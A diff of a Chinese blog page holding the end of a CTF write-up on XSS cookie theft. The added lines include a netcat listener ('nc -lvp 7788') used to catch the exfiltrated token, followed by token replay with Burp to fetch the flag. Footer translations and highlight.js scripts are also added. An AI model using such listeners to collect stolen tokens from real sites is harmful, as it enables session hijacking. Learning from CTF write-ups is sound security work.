-<p>提交脚本跑出来的code，收到Success的同时查看服务器<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/15.jpg" class="lazyload" data-srcset="15.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>成功带出token。那么用bp换token访问/flag吧。<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/16.jpg" class="lazyload" data-srcset="16.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
+<pre><code>nc -lvp 7788</code></pre><p>提交脚本跑出来的code，收到Success的同时查看服务器<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/15.jpg" class="lazyload" data-srcset="15.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>成功带出token。那么用bp换token访问/flag吧。<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/16.jpg" class="lazyload" data-srcset="16.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 <p>这道题真的花了很久。毕竟自己在此之前没接触过一道xss打cookie的真题。但是还是靠着网上知识学到了许多，成功拿到自己的flag。所以要多多向各位dalao以及百度谷歌学习啊。</p>
 
   
@@ -756,7 +951,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -768,9 +963,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -903,6 +1098,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1116,7 +1313,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1172,6 +1369,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
